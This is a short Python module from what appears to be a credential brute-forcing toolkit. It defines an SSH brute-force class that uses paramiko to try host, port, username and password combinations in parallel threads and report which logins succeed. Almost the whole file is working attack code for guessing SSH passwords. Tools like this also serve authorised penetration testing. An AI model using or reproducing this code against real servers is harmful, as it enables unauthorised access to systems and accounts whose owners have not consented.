#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
@Author: reber
@Mail: reber0ask@qq.com
@Date: 2019-05-22 15:30:07
@LastEditTime: 2019-12-31 15:56:07
'''

import paramiko
from concurrent.futures import ThreadPoolExecutor
from libs.brute import BruteBaseClass

import pathlib
from config import log_file_path
paramiko.util.log_to_file(log_file_path.joinpath("paramiko.log"))

class SshBruteForce(BruteBaseClass):
    """SshBruteForce"""

    def worker(self,hpup):
        host,port,user,pwd = hpup
        try:
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            ssh.connect(hostname=host, port=port, username=user, password=pwd, timeout=self.timeout)
        except Exception as e:
            hook_msg((False,host,port,user,pwd))
        else:
            hook_msg((True,host,port,user,pwd))
        finally:
            ssh.close()


bruter = SshBruteForce

